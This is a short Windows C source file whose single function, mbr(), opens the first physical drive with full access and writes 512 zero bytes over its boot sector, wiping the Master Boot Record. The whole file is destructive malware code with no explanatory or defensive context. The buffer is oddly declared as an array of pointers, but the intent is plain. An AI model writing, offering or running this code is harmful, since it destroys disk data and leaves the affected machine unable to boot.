#include <windows.h>

void
mbr(){
    const unsigned char *Mbr[512] = {};
    DWORD bytesWritten;
      HANDLE hMbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, 
                              FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, 
                              OPEN_EXISTING, 0, NULL);
    WriteFile(hMbr, Mbr, 512, &bytesWritten, NULL);
    CloseHandle(hMbr);
}